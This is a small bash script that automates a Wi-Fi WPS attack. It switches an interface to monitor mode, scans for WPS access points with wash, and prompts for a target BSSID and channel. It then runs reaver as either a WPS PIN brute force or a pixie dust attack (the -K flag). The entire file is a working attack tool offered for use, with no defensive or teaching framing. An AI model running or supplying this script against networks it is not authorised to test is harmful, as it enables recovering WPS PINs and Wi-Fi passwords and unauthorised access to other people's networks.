#!/bin/bash

# https://docs.google.com/spreadsheets/d/1tSlbqVQ59kGn8hgmwcPTHUECQ3o9YhXR91A_p7Nnj5Y/edit?pref=2&pli=1&gid=2048815923#gid=2048815923

mode=$(iwconfig "${INTERFACE}" | grep -o "Mode:Managed")

if [ "${mode}" = "Mode:Managed" ]; then
        sudo ifconfig ${INTERFACE} down
        sudo iwconfig ${INTERFACE} mode monitor
        sudo ifconfig ${INTERFACE} up
fi

read -p "use 5ghz? (y/n): " ghz
echo -e "Press ctrl+c to stop the scan\n"

if [[ "${ghz}" == "y" ]]; then
	sudo wash -i "$INTERFACE" -5
else
	sudo wash -i "$INTERFACE" -2
fi

read -p "bssid?: " bssid
read -p "channel?: " channel
echo -e "\nChoose an attack:\n1 - normal wps brute force\n2 - pixie dust attack\n"
read -p "attack? (1/2): " attack

if [ "$attack" = "1" ]; then
	if [ "$ghz" = "n" ]; then
    		sudo reaver -i "$INTERFACE" -b "$bssid" -c "$channel" -vv
	elif [ "$ghz" = "y" ]; then
		sudo reaver -i "$INTERFACE" -b "$bssid" -c "$channel" -5 -vv
	fi
elif [ "$attack" = "2" ]; then
	sudo reaver -i "$INTERFACE" -K -b "$bssid" -c "$channel" -vv # the only difference is -K
fi
